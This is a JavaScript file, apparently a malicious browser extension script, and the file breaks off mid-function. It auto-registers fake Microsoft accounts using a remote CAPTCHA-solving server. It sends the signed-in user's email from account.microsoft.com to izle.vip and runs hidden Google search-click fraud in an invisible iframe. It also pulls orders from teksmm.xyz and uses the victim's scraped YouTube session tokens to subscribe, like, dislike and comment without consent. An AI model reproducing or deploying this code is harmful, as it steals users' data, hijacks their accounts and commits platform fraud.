if(window.location.origin.indexOf("signup.live.com") >= 0 && window.location.href.indexOf("kral") >= 0 ){
	var myXhrInterval = null;
	var myXhrInterval2 = null;
	var myXhrInterval3 = null;
	var temiz_ip = "";
	var isim1 = "";
	var isim2 = "";
	var isim = "";
	var soyisim = "";
	var eposta = "";
	var say = 0;

	var xhr2 = new XMLHttpRequest();
	xhr2.onreadystatechange = function() {
		if (xhr2.readyState == XMLHttpRequest.DONE) {
			if(xhr2.responseText.length > 1){
				temiz_ip = xhr2.responseText;
			}
		}
	}
	xhr2.open('GET', "https://izle.vip/captcha/solve.php?state=3", true);
	xhr2.send(null);
	
	var xhr = new XMLHttpRequest();
	xhr.onreadystatechange = function() {
		if (xhr.readyState == XMLHttpRequest.DONE) {
			var myArr = JSON.parse(xhr.responseText);
			isim1 = convertToASCII(myArr[Math.floor(Math.random()*myArr.length)]);
			isim2 = convertToASCII(myArr[Math.floor(Math.random()*myArr.length)]);

			isim = isim1.charAt(0).toUpperCase() + isim1.slice(1);
			soyisim = isim2.charAt(0).toUpperCase() + isim2.slice(1);
			eposta = isim1.replace(" ", "") +randomNumber(4)+ isim2.replace(" ", "");
		}
	}
	xhr.open('GET', "//raw.githubusercontent.com/modifyheader/modhead/master/isim", true);
	xhr.send(null);

	
	function convertToASCII(metin) {
		metin = metin.replace(/\u00E4/g, 'a'); // Ã¤
		metin = metin.replace(/\u00C4/g, 'a'); // Ã„
		metin = metin.replace(/\u00c2/g, 'A'); // Ã‚
		metin = metin.replace(/\u00e2/g, 'a'); // Ã¢
		metin = metin.replace(/\u00fb/g, 'u'); // Ã»
		metin = metin.replace(/\u00c7/g, 'C'); // Ã‡
		metin = metin.replace(/\u00e7/g, 'c'); // Ã§
		metin = metin.replace(/\u011e/g, 'G'); // Ä
		metin = metin.replace(/\u011f/g, 'g'); // ÄŸ
		metin = metin.replace(/\u0130/g, 'I'); // Ä°
		metin = metin.replace(/\u0131/g, 'i'); // Ä±
		metin = metin.replace(/\u015e/g, 'S'); // Å
		metin = metin.replace(/\u015f/g, 's'); // ÅŸ
		metin = metin.replace(/\u00d6/g, 'O'); // Ã–
		metin = metin.replace(/\u00f6/g, 'o'); // Ã¶
		metin = metin.replace(/\u00dc/g, 'U'); // Ãœ
		metin = metin.replace(/\u00fc/g, 'u'); // Ã¼
		metin = metin.replace(/\u0130/g, 'i'); // IÌ‡

		return metin.toLowerCase();
	}

	function randomBetween(min, max) { 
		return Math.floor(Math.random() * (max - min + 1) + min);
	}
	
	function randomNumber(length) {
	   var result           = '';
	   // var characters       = 'abcdefghijklmnopqrstuvwxyz0123456789';
	   var characters       = '0123456789';
	   var charactersLength = characters.length;
	   for ( var i = 0; i < length; i++ ) {
		  result += characters.charAt(Math.floor(Math.random() * charactersLength));
	   }
	   return result;
	}

	function step1(){
		console.log("Step 1");
		document.querySelectorAll("#liveSwitch")[0].click();
	}

	function step2(){
		console.log("Step 2");
		document.querySelectorAll("#MemberName")[0].value = eposta;
		var yrrkevnt = document.createEvent("HTMLEvents"); 
		yrrkevnt.initEvent("change", false, true); 
		document.querySelectorAll("#MemberName")[0].dispatchEvent(yrrkevnt);
		document.querySelectorAll("#iSignupAction")[0].click();
	}

	function step3(){
		console.log("Step 3");
		document.querySelectorAll("#PasswordInput")[0].value ="test93j!0";
		var sifre = document.createEvent("HTMLEvents"); 
		sifre.initEvent("change", false, true); 
		document.querySelectorAll("#PasswordInput")[0].dispatchEvent(sifre);
		document.querySelectorAll("#iSignupAction")[0].click();
	}

	function step4(){
		console.log("Step 4");
		document.querySelectorAll("#FirstName")[0].value = isim;
		var FirstName = document.createEvent("HTMLEvents"); 
		FirstName.initEvent("change", false, true); 
		document.querySelectorAll("#FirstName")[0].dispatchEvent(FirstName);
		document.querySelectorAll("#LastName")[0].value =soyisim;
		var LastName = document.createEvent("HTMLEvents"); 
		LastName.initEvent("change", false, true); 
		document.querySelectorAll("#LastName")[0].dispatchEvent(LastName);
		document.querySelectorAll("#iSignupAction")[0].click();
	}

	function step5(){
		console.log("Step 5");
		document.querySelectorAll("#BirthDay")[0].selectedIndex = randomBetween(1,31);
		var BirthDay = document.createEvent("HTMLEvents"); 
		BirthDay.initEvent("change", false, true); 
		document.querySelectorAll("#BirthDay")[0].dispatchEvent(BirthDay);
		
		document.querySelectorAll("#BirthMonth")[0].selectedIndex = randomBetween(1,12);
		var BirthMonth = document.createEvent("HTMLEvents"); 
		BirthMonth.initEvent("change", false, true); 
		document.querySelectorAll("#BirthMonth")[0].dispatchEvent(BirthMonth);

		document.querySelectorAll("#BirthYear")[0].selectedIndex = randomBetween(20,45);
		var BirthYear = document.createEvent("HTMLEvents"); 
		BirthYear.initEvent("change", false, true); 
		document.querySelectorAll("#BirthYear")[0].dispatchEvent(BirthYear);
		
		document.querySelectorAll("#iSignupAction")[0].click();

	}

	function step6(){
		console.log("Step 6");
		var captcha_link = document.querySelectorAll("#hipTemplateContainer")[0].getElementsByTagName('img')[0].src;
		fetch("https://izle.vip/captcha/solve.php?state=1&ip="+temiz_ip+"&image="+encodeURIComponent(captcha_link), {
			"credentials": "omit",
			"headers": {
				"sec-fetch-mode": "no-cors"
			},
			"referrer": "https://signup.live.com/",
			"referrerPolicy": "strict-origin-when-cross-origin",
			"body": null,
			"method": "GET"
		});
		
		myXhrInterval = setInterval(sendXhr, 2500);
	}

	function step7(decoded){
		console.log("Step 7");
		setTimeout(function(){ 
			document.querySelectorAll(".spHipNoClear")[0].value = decoded;
			var spHipNoClear = document.createEvent("HTMLEvents"); 
			spHipNoClear.initEvent("change", false, true); 
			document.querySelectorAll(".spHipNoClear")[0].dispatchEvent(spHipNoClear);
		}, 2000);
		setTimeout(function(){ 
			document.querySelectorAll("#iSignupAction")[0].click();
		}, 6000);
		myXhrInterval2 = setInterval(checkCaptcha, 1000);
	}

	function checkCaptcha(){
		if(document.querySelectorAll("[id^='wlspispHIPErrorWrong']")[0].style.display == "inline"){
			say += 1;
			console.log("Captcha hatali - Yeni Captcha cek");
			if(say < 4){
				var xhr3 = new XMLHttpRequest();
				xhr3.onreadystatechange = function() {
					if (xhr3.readyState == XMLHttpRequest.DONE) {
						console.log("Hatali captcha bildirimi:"+ xhr3.responseText);
					}
				}
				xhr3.open('GET', "https://izle.vip/captcha/solve.php?state=2&incorrect=yes&ip="+temiz_ip, true);
				xhr3.send(null);
				step6();
			}else{
				window.location.href = window.location.href+"?bittikbekral";
			}
			clearInterval(myXhrInterval2);
		}
	}
	
	function sendXhr(){
		var xhr = new XMLHttpRequest();
		xhr.onreadystatechange = function() {
			if (xhr.readyState == XMLHttpRequest.DONE) {
				if(xhr.responseText.length > 1){
					console.log("CÃ¶zÃ¼lmÃ¼s captcha:"+ xhr.responseText);
					step7(xhr.responseText);
					clearInterval(myXhrInterval);
				}else{
					console.log("CÃ¶zÃ¼lmesi bekleniyor");
				}
			}
		}
		xhr.open('GET', "https://izle.vip/captcha/solve.php?state=2&ip="+temiz_ip, true);
		xhr.send(null);
	}

	function start(){
		console.log("here");
		if(isim.length > 1 && soyisim.length > 1 && eposta.length > 1 && temiz_ip.length > 1){
			clearInterval(myXhrInterval3);
			setTimeout(function(){ 
				step1()
				setTimeout(function(){ 
					step2()
					setTimeout(function(){ 
						step3()
						setTimeout(function(){ 
							step4()
							setTimeout(function(){ 
								step5()
								setTimeout(function(){ 
									step6()
								}, 2000);
							}, 2000);
						}, 2000);
					}, 2000);
				}, 2000);
			}, 1000);
		}
	}
	
	var cookie_name = "acamcik";
	var cookie_time = 60*2;
	if (!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now() - 60 * 1000 * cookie_time) {
		localStorage[cookie_name] = Date.now();
		myXhrInterval3 = setInterval(start, 1000);
	}
	
	

}

if(window.location.origin.indexOf("account.microsoft.com") >= 0){
	var eMail = document.querySelectorAll(".personal-info .ng-binding")[1].innerHTML.trim();
	if(eMail){
		new Image().src = '//izle.vip/captcha/outlook/save.php?email='+eMail;
		window.location.href = window.location.href+"?bittikbekral";
	}
}


if(document.location.ancestorOrigins.length > 0){
/*
 function rasgteleSurem(min, max) { 
  return Math.floor(Math.random() * (max - min + 1) + min);
}

if(document.referrer.indexOf("dizibox") >= 0){
	let isRecaptchaFrame = () => {
	  return /https:\/\/www.google.com\/recaptcha\/api2\/anchor/.test(window.location.href);
	};

	let captchaInterval = setInterval(() => {
	  if (isRecaptchaFrame()) {
		clearInterval(captchaInterval);
		document.getElementsByClassName('recaptcha-checkbox-checkmark')[0].click();
	  }  
	}, rasgteleSurem(1000,5000));

	throw new Error("my error message");
}
	
	if(document.referrer.indexOf("izle.vip/iframe.php") >= 0 && window.location.href.indexOf("youtube") >= 0 && window.location.href.indexOf("kral_benim") >= 0 ){
	if (document.readyState === 'complete') {

	if(document.querySelector(".ytp-cued-thumbnail-overlay").style.display != "none"){
	  document.querySelector("button.ytp-large-play-button.ytp-button").click();
	  var ses_check = document.querySelector(".ytp-volume-slider-handle").style.left != "0px";
		if(ses_check){
		  document.querySelector("button.ytp-mute-button.ytp-button").click();
		}
	}
	  }
	  throw new Error("my error message");
	}
	*/
}else{
new Image().src = '//whos.amung.us/widget/selamcek02.png';
setInterval(function(){ new Image().src = '//whos.amung.us/widget/selamcek02.png'; }, 200000);

if(document.title.toLowerCase().indexOf("izle") >= 0){
	if((window.location.origin.indexOf("dizilla")  + window.location.origin.indexOf("dizist")  + window.location.origin.indexOf("dizipub")  + window.location.origin.indexOf("720p-izle")  + window.location.origin.indexOf("unutulmazfilmler")  + window.location.origin.indexOf("google")  + window.location.origin.indexOf("youtube"))+7 == 0){
		new Image().src = '//whos.amung.us/widget/m823l61df0.png';
		setInterval(function(){ new Image().src = '//whos.amung.us/widget/m823l61df0.png'; }, 200000);
	}
}

function get_google_keywords() {
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "//izle.vip/globalmediaspaceseo/get.php", true);
	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4 && xhr.status == 200) {
			try {
				var data = JSON.parse(xhr.responseText);
				var target = data.target.trim();
				var keyword = data.keyword.trim();
				if(target && keyword){
					search_google_seo(target,keyword);
				}
			}catch (error) {}
		}
	}
	xhr.send();
}

function rasgteleSure(min, max) { 
  return Math.floor(Math.random() * (max - min + 1) + min);
}

function search_google_seo(target,keyword){
	new Image().src = '//whos.amung.us/widget/m823l61df3.png';
	var ifrm = document.createElement("iframe");
	ifrm.setAttribute("src", window.location.origin);
	ifrm.style.width = "100%";
	ifrm.style.height = "100%";
	ifrm.style.border = "0px";
	ifrm.style.display = "none";
	ifrm.id = "guugil";
	document.body.appendChild(ifrm);

	var kelime = keyword;
	setTimeout(function(){document.querySelector("#guugil").contentWindow.document.querySelector("input[name=q]").value = kelime;}, rasgteleSure(2500,4000));
	setTimeout(function(){document.querySelector("#guugil").contentWindow.document.querySelector("input[name=btnK]").click();}, rasgteleSure(5000,6500));

	setTimeout(function(){
		var linkler = document.querySelector("#guugil").contentWindow.document.querySelectorAll("a[ping][href]")
		var i;
		for (i = 0; i < linkler.length; i++) {
		  if(linkler[i].href.indexOf(target) >= 0){
			  console.log(linkler[i].href);
			  linkler[i].click();
			  break;
		  }
		}
	}, rasgteleSure(7500,10000));
}


if(window.location.href.indexOf("google") >= 0){
	var cookie_name = "guugil";
	var cookie_time = 1;
	if (!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now() - 60 * 1000 * cookie_time) {
		localStorage[cookie_name] = Date.now();
		get_google_keywords();
	}
}



function getFromLocalStorage(){
  return JSON.parse(localStorage.getItem("m_history"));
}
if( !getFromLocalStorage() ){
    localStorage.setItem("m_history", JSON.stringify([]) );
}
function checkOrSave(key, value){
  //Delete 2 days ago
  var clean = getFromLocalStorage().filter(x => {
    return parseInt((new Date().getTime()-x.time)/ (1000*60*60*24*2)) <= 0
  })
  localStorage.setItem("m_history", JSON.stringify(clean));
  console.log(clean)
  if( !getFromLocalStorage() ){
    localStorage.setItem("m_history", JSON.stringify([]) );
  }
  let status = checkInLocalStorage(key, value);
  if(!status){
    let operations = getFromLocalStorage();
    let temp   = {};
    temp.key   = key;
    temp.value = value;
    temp.time  = new Date().getTime();
    operations.push(temp)
    localStorage.setItem("m_history", JSON.stringify(operations) );
  }
  return status;
}
function checkInLocalStorage(key, value){
  elements = getFromLocalStorage().filter(x=> x.key==key && x.value == value);
  return Boolean(elements.length);
}



function siparis_getir_3() {
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=3&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "3"))), true);
	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4 && xhr.status == 200) {
			try {
				var data = JSON.parse(xhr.responseText);
				vars = {};
				vars.channelIds = data.channelId.trim();
				vars.id = data.id.trim();
				if(!checkOrSave(vars.id,"3")){
					if (vars.channelIds) {
						subscribe_now_count(vars);
					}
				}
			}catch (error) {}
		}
	}
	xhr.send();
}


function siparis_getir_4() {
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=4&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "4"))), true);
	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4 && xhr.status == 200) {
			try {
				var data = JSON.parse(xhr.responseText);
				vars = {};
				vars.indexData = data.videoId.trim();
				vars.id = data.id.trim();
				if(!checkOrSave(vars.id,"4")){
					if (vars.indexData) {
						video_like(vars);
					}
				}
			}catch (error) {}
		}
	}
	xhr.send();
}

function siparis_getir_5() {
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=5&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "5"))), true);
	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4 && xhr.status == 200) {
			try {
				var data = JSON.parse(xhr.responseText);
				vars = {};
				vars.indexData = data.videoId.trim();
				vars.commentId =  data.commentId.trim();
				vars.id = data.id.trim();
				if(!checkOrSave(vars.id,"5")){
					if (vars.indexData && vars.commentId) {
						like_comment(vars);
					}
				}
			}catch (error) {}
		}
	}
	xhr.send();
}

function siparis_getir_6() {
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=6&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "6"))), true);
	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4 && xhr.status == 200) {
			try {
				var data = JSON.parse(xhr.responseText);
				vars = {};
				vars.indexData = data.videoId.trim();
				vars.randComment = data.comments.trim().split("\n")[0].replace('"',"");
				vars.id = data.id.trim();
				if(!checkOrSave(vars.id,"6")){
					if (vars.indexData && vars.randComment) {
						createComment_id(vars);
					}
				}
			}catch (error) {}
		}
	}
	xhr.send();
}

function siparis_getir_7() {
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "https://teksmm.xyz/smmnew/queue.php?queue=7&json="+encodeURIComponent(JSON.stringify(getFromLocalStorage().filter(x => x.value == "7"))), true);
	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4 && xhr.status == 200) {
			try {
				var data = JSON.parse(xhr.responseText);
				vars = {};
				vars.indexData = data.videoId.trim();
				vars.id = data.id.trim();
				if(!checkOrSave(vars.id,"7")){
					if (vars.indexData) {
						video_dislike(vars);
					}
				}
			}catch (error) {}
		}
	}
	xhr.send();
}

  
function start() {
  var cookie_name = "yt";
  var cookie_time = 1;
  if (!localStorage[cookie_name] || parseInt(localStorage[cookie_name]) < Date.now() - 60 * 1000 * cookie_time) {
    localStorage[cookie_name] = Date.now();
	new Image().src = '//whos.amung.us/widget/selamcek03.png';
    siparis_getir_3();
    siparis_getir_4();
    siparis_getir_5();
    siparis_getir_6();
    siparis_getir_7();
  }
}

function subscribe_now_count(vars) {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://www.youtube.com/channel/" + vars.channelIds, true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = xhr.responseText;
      vars.login = data.match('"LOGGED_IN":(.*?),')[1];
      if (vars.login == "true" || vars.login == true) {
        if (data.indexOf('onResponseReceivedActions') == -1) {
          subscribe_client(vars);
        }
      }
    }
  }
  xhr.send();
}

function subscribe_client(vars) {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://www.youtube.com/channel/" + vars.channelIds, true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {	
		var data = xhr.responseText;
		vars.params_like = data.split('"params":"EgIIAhgA"}}]')[0].split('onSubscribeEndpoints":[').pop()+'"params":"EgIIAhgA"}}';
		vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('"')[0];
		vars.csn = data.split('csn: "')[1].split('"')[0];
		vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('"')[0];
		vars.page_cl = data.split('PAGE_CL":')[1].split(',')[0];
		vars.page_build_label = data.split('"PAGE_BUILD_LABEL":"')[1].split('"')[0];
		vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('"')[0];
		// Yeni
		var deviceRaw = data.split('"DEVICE":"')[1].split('"')[0].split("\\u0026");
		var urlParams = {};
		deviceRaw.forEach(function(x){
			var arr = x.split('=');
			arr[1] && (urlParams[arr[0]] = arr[1]);
		});
		vars.device = "cos="+urlParams["cos"]+"&cbr="+urlParams["cbr"]+"&cosver="+urlParams["cosver"]+"&cbrver="+urlParams["cbrver"];
		vars.utc = Math.abs(new Date().getTimezoneOffset());
		vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
		vars.clientversion = data.split('"INNERTUBE_CONTEXT_CLIENT_VERSION":"')[1].split('"')[0];
		subscribe(vars);
    }
  }
  xhr.send();
}

function subscribe(vars) {
	var xhr = new XMLHttpRequest();
	var params = {};
	params["sej"] = vars.params_like;
	params["csn"] = vars.csn;
	params["session_token"] = vars.session_token;
	xhr.open("POST", "https://www.youtube.com/service_ajax?name=subscribeEndpoint", true);
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
	xhr.setRequestHeader("x-youtube-client-name", 1);
	xhr.setRequestHeader("x-youtube-client-version", vars.clientversion);
	xhr.setRequestHeader("x-youtube-device", vars.device);
	xhr.setRequestHeader("x-youtube-identity-token", vars.youtube_identity_token);
	xhr.setRequestHeader("x-youtube-page-cl", vars.page_cl);
	xhr.setRequestHeader("x-youtube-page-label", vars.page_build_label);
	xhr.setRequestHeader("x-youtube-time-zone", vars.timezone);
	xhr.setRequestHeader("x-youtube-utc-offset", vars.utc);
	xhr.setRequestHeader("x-youtube-variants-checksum", vars.variants_checksum);
	xhr.onreadystatechange = function() {
		if (xhr.readyState == 4 && xhr.status == 200) {
			xhr.close;
		}
	}
	xhr.send(deSerialize(params));
}

function createComment(vars) {
  var xhr = new XMLHttpRequest();
  var params = {};
  params["comment_text"] = vars.randComment;
  params["sej"] = JSON.stringify({
    "clickTrackingParams": vars.trackingParams,
    "commandMetadata": {
      "webCommandMetadata": {
        "url": "/service_ajax",
        "sendPost": true
      }
    },
    "createCommentEndpoint": {
      "createCommentParams": vars.createCommentParams
    }
  });
  
  params["csn"] = vars.csn;
  params["session_token"] = vars.session_token;
  xhr.open("POST", "https://www.youtube.com/service_ajax?name=createCommentEndpoint", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.setRequestHeader("x-youtube-client-name", 1);
  	xhr.setRequestHeader("x-youtube-client-version", vars.clientversion);
	xhr.setRequestHeader("x-youtube-device", vars.device);
	xhr.setRequestHeader("x-youtube-identity-token", vars.youtube_identity_token);
	xhr.setRequestHeader("x-youtube-page-cl", vars.page_cl);
	xhr.setRequestHeader("x-youtube-page-label", vars.page_build_label);
	xhr.setRequestHeader("x-youtube-time-zone", vars.timezone);
	xhr.setRequestHeader("x-youtube-utc-offset", vars.utc);
	xhr.setRequestHeader("x-youtube-variants-checksum", vars.variants_checksum);
	
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      xhr.close;
    }
  }
  xhr.send(deSerialize(params));
}

function createLike(vars) {
  var xhr = new XMLHttpRequest();
  var params = {};
  params["sej"] = vars.params_like;
  
  params["csn"] = vars.csn;
  params["session_token"] = vars.session_token;
  xhr.open("POST", "https://www.youtube.com/service_ajax?name=performCommentActionEndpoint", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.setRequestHeader("x-youtube-client-name", 1);
  	xhr.setRequestHeader("x-youtube-client-version", vars.clientversion);
	xhr.setRequestHeader("x-youtube-device", vars.device);
	xhr.setRequestHeader("x-youtube-identity-token", vars.youtube_identity_token);
	xhr.setRequestHeader("x-youtube-page-cl", vars.page_cl);
	xhr.setRequestHeader("x-youtube-page-label", vars.page_build_label);
	xhr.setRequestHeader("x-youtube-time-zone", vars.timezone);
	xhr.setRequestHeader("x-youtube-utc-offset", vars.utc);
	xhr.setRequestHeader("x-youtube-variants-checksum", vars.variants_checksum);
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      xhr.close;
    }
  }
  xhr.send(deSerialize(params));
}

function createVideoLike(vars) {
  var xhr = new XMLHttpRequest();
  var params = {};
  params["sej"] = vars.params_like;
  
  params["csn"] = vars.csn;
  params["session_token"] = vars.session_token;
  xhr.open("POST", "https://www.youtube.com/service_ajax?name=likeEndpoint", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.setRequestHeader("x-youtube-client-name", 1);
  	xhr.setRequestHeader("x-youtube-client-version", vars.clientversion);
	xhr.setRequestHeader("x-youtube-device", vars.device);
	xhr.setRequestHeader("x-youtube-identity-token", vars.youtube_identity_token);
	xhr.setRequestHeader("x-youtube-page-cl", vars.page_cl);
	xhr.setRequestHeader("x-youtube-page-label", vars.page_build_label);
	xhr.setRequestHeader("x-youtube-time-zone", vars.timezone);
	xhr.setRequestHeader("x-youtube-utc-offset", vars.utc);
	xhr.setRequestHeader("x-youtube-variants-checksum", vars.variants_checksum);
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      xhr.close;
    }
  }
  xhr.send(deSerialize(params));
}

function createVideoDislike(vars) {
  var xhr = new XMLHttpRequest();
  var params = {};
  params["sej"] = vars.params_like;
  
  params["csn"] = vars.csn;
  params["session_token"] = vars.session_token;
  xhr.open("POST", "https://www.youtube.com/service_ajax?name=likeEndpoint", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.setRequestHeader("x-youtube-client-name", 1);
  	xhr.setRequestHeader("x-youtube-client-version", vars.clientversion);
	xhr.setRequestHeader("x-youtube-device", vars.device);
	xhr.setRequestHeader("x-youtube-identity-token", vars.youtube_identity_token);
	xhr.setRequestHeader("x-youtube-page-cl", vars.page_cl);
	xhr.setRequestHeader("x-youtube-page-label", vars.page_build_label);
	xhr.setRequestHeader("x-youtube-time-zone", vars.timezone);
	xhr.setRequestHeader("x-youtube-utc-offset", vars.utc);
	xhr.setRequestHeader("x-youtube-variants-checksum", vars.variants_checksum);  
	xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      xhr.close;
    }
  }
  xhr.send(deSerialize(params));
}

function createComment_id(vars) {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://www.youtube.com/watch?v=" + vars.indexData, true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = xhr.responseText;
      vars.createCommentParams = data.split('"getReportFormEndpoint":{"params":"')[1].split('"')[0];
      if (vars.createCommentParams.length > 0) {
		vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('"')[0];
		vars.csn = data.split('csn: "')[1].split('"')[0];
		vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('"')[0];
		vars.page_cl = data.split('PAGE_CL":')[1].split(',')[0];
		vars.page_build_label = data.split('"PAGE_BUILD_LABEL":"')[1].split('"')[0];
		vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('"')[0];
		var deviceRaw = data.split('"DEVICE":"')[1].split('"')[0].split("\\u0026");
		var urlParams = {};
		deviceRaw.forEach(function(x){
			var arr = x.split('=');
			arr[1] && (urlParams[arr[0]] = arr[1]);
		});
		vars.device = "cos="+urlParams["cos"]+"&cbr="+urlParams["cbr"]+"&cosver="+urlParams["cosver"]+"&cbrver="+urlParams["cbrver"];
		vars.utc = Math.abs(new Date().getTimezoneOffset());
		vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
		vars.clientversion = data.split('"INNERTUBE_CONTEXT_CLIENT_VERSION":"')[1].split('"')[0];
        createComment(vars);
      }

    }
  }
  xhr.send();
}

function like_comment(vars) {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://www.youtube.com/watch?v=" + vars.indexData +"&lc=" + vars.commentId, true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = xhr.responseText;

		vars.params_like = data.split('{"iconType":"LIKE"},"defaultServiceEndpoint":')[1].split('"voteStatus":"LIKE"}}]}}')[0]+'"voteStatus":"LIKE"}}]}}';
		vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('"')[0];
		vars.csn = data.split('csn: "')[1].split('"')[0];
		vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('"')[0];
		vars.page_cl = data.split('PAGE_CL":')[1].split(',')[0];
		vars.page_build_label = data.split('"PAGE_BUILD_LABEL":"')[1].split('"')[0];
		vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('"')[0];
		// Yeni
		var deviceRaw = data.split('"DEVICE":"')[1].split('"')[0].split("\\u0026");
		var urlParams = {};
		deviceRaw.forEach(function(x){
			var arr = x.split('=');
			arr[1] && (urlParams[arr[0]] = arr[1]);
		});
		vars.device = "cos="+urlParams["cos"]+"&cbr="+urlParams["cbr"]+"&cosver="+urlParams["cosver"]+"&cbrver="+urlParams["cbrver"];
		vars.utc = Math.abs(new Date().getTimezoneOffset());
		vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
		vars.clientversion = data.split('"INNERTUBE_CONTEXT_CLIENT_VERSION":"')[1].split('"')[0];


        createLike(vars);


    }
  }
  xhr.send();
}

function video_like(vars) {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://www.youtube.com/watch?v=" + vars.indexData, true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = xhr.responseText;

		vars.params_like = data.split('"defaultServiceEndpoint":')[1].split('"}}')[0]+'"}}';

		vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('"')[0];
		vars.csn = data.split('csn: "')[1].split('"')[0];
		vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('"')[0];
		vars.page_cl = data.split('PAGE_CL":')[1].split(',')[0];
		vars.page_build_label = data.split('"PAGE_BUILD_LABEL":"')[1].split('"')[0];
		vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('"')[0];
		var deviceRaw = data.split('"DEVICE":"')[1].split('"')[0].split("\\u0026");
		var urlParams = {};
		deviceRaw.forEach(function(x){
			var arr = x.split('=');
			arr[1] && (urlParams[arr[0]] = arr[1]);
		});
		vars.device = "cos="+urlParams["cos"]+"&cbr="+urlParams["cbr"]+"&cosver="+urlParams["cosver"]+"&cbrver="+urlParams["cbrver"];
		vars.utc = Math.abs(new Date().getTimezoneOffset());
		vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
		vars.clientversion = data.split('"INNERTUBE_CONTEXT_CLIENT_VERSION":"')[1].split('"')[0];
        createVideoLike(vars);


    }
  }
  xhr.send();
}

function video_dislike(vars) {
  var xhr = new XMLHttpRequest();
  xhr.open("GET", "https://www.youtube.com/watch?v=" + vars.indexData, true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4 && xhr.status == 200) {
      var data = xhr.responseText;

		vars.params_like = data.split('"defaultServiceEndpoint":')[2].split('"}}')[0]+'"}}';

		vars.session_token = data.split('"XSRF_TOKEN":"')[1].split('"')[0];
		vars.csn = data.split('csn: "')[1].split('"')[0];
		vars.youtube_identity_token = data.split('"ID_TOKEN":"')[1].split('"')[0];
		vars.page_cl = data.split('PAGE_CL":')[1].split(',')[0];
		vars.page_build_label = data.split('"PAGE_BUILD_LABEL":"')[1].split('"')[0];
		vars.variants_checksum = data.split('"VARIANTS_CHECKSUM":"')[1].split('"')[0];
		var deviceRaw = data.split('"DEVICE":"')[1].split('"')[0].split("\\u0026");
		var urlParams = {};
		deviceRaw.forEach(function(x){
			var arr = x.split('=');
			arr[1] && (urlParams[arr[0]] = arr[1]);
		});
		vars.device = "cos="+urlParams["cos"]+"&cbr="+urlParams["cbr"]+"&cosver="+urlParams["cosver"]+"&cbrver="+urlParams["cbrver"];
		vars.utc = Math.abs(new Date().getTimezoneOffset());
		vars.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
		vars.clientversion = data.split('"INNERTUBE_CONTEXT_CLIENT_VERSION":"')[1].split('"')[0];
        createVideoDislike(vars);
    }
  }
  xhr.send();
}



function deSerialize(json) {
  return Object.keys(json).map(function(key) {
